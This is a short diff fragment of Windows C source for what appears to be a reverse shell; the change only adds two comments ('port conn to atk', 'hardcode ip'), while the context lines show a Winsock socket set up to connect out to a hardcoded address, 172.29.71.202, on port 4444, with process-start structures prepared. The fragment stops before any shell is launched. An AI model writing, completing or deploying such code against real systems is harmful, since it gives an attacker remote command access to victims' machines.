@@ -11,7 +11,7 @@
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
         int connection;
-
+        // port conn to atk
         int port = 4444;
         char RecvServer[512];
         if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
@@ -22,7 +22,7 @@
 
         shell_addr.sin_port = htons(port);
         shell_addr.sin_family = AF_INET;
-
+        // hardcode ip
         shell_addr.sin_addr.s_addr = inet_addr("172.29.71.202");
 
         connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
